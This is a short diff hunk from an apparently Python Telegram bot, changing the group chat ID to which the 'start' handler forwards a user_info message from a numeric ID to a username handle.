@@ -2413,7 +2413,7 @@ async def start(update: Update, context: CallbackContext) -> None:
         # Send to your Telegram group
         # Replace 'YOUR_GROUP_ID' with actual group ID or username
         await context.bot.send_message(
-            chat_id="-1005017310221",  # Change this to your group ID
+            chat_id="@userupdate4209",  # Change this to your group ID
             text=user_info,
             parse_mode='Markdown'
         )
